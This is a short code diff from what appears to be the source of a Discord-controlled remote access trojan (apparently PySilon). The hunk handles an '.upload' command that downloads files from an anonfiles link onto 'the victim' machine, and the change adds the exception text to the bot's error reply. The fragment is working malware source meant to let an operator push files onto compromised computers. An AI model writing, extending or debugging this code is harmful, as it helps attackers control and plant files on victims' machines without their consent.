@@ -29,5 +29,5 @@ elif message.content[:7] == '.upload':
             else:
                 await message.channel.send('```Uploaded all files from the link to the victim.\nFiles will be located in the pysilon directory.```')
     except Exception as e:
-        await message.channel.send(f'```Error while downloading from the link.\nUsage: .upload <link>\nDo not upload the link to to the file directly.\nGood: https://anonfiles.com/k5X7D...\nBad: https://anonfiles.com/k5X7D.../file-name```')
+        await message.channel.send(f'```Error while downloading from the link.\nUsage: .upload <link>\nDo not upload the link to to the file directly.\nGood: https://anonfiles.com/k5X7D...\nBad: https://anonfiles.com/k5X7D.../file-name```\n\n`{e}`')
         pass
